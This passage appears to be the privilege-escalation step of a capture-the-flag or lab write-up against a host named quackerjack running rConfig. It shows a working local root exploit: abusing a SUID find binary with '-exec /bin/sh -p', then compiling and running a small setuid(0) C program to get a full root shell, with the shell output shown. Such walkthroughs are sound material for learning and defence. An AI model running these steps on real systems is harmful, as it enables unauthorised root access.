# 7 privesc > root

```
bash-4.2$ /usr/bin/find . -exec /bin/sh -p \; -quit
sh-4.2# whoami;id;hostname
root
uid=48(apache) gid=48(apache) euid=0(root) groups=48(apache)
quackerjack

# uid is not root;
# lets set uid to root using c shell

$ cat setuid.c
#include <unistd.h>

int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
} 

bash-4.2$ chmod 777 setuid
bash-4.2$ find . -exec './setuid' \;
[root@quackerjack rconfig]# whoami;id;hostname
root
uid=0(root) gid=48(apache) groups=48(apache)
quackerjack
```
